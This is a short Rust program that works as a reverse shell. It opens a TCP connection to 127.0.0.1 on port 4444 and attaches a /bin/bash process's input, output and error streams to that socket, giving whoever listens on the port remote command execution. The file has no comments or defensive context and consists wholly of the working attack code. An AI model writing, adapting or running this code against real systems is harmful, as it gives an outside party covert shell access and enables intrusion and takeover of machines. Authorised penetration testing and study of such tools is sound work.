use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main(){

    let ip: &str = "127.0.0.1";
    let port: i32 = 4444;

    let conn = TcpStream::connect(format!("{}:{}", ip, port)).unwrap();
    let fileDescriptor = conn.as_raw_fd();

    Command::new("/bin/bash")
        .stdin(unsafe { Stdio::from_raw_fd(fileDescriptor)})
        .stdout(unsafe { Stdio::from_raw_fd(fileDescriptor)})
        .stderr(unsafe { Stdio::from_raw_fd(fileDescriptor)})
        .spawn()
        .unwrap()
        .wait()
        .unwrap();

}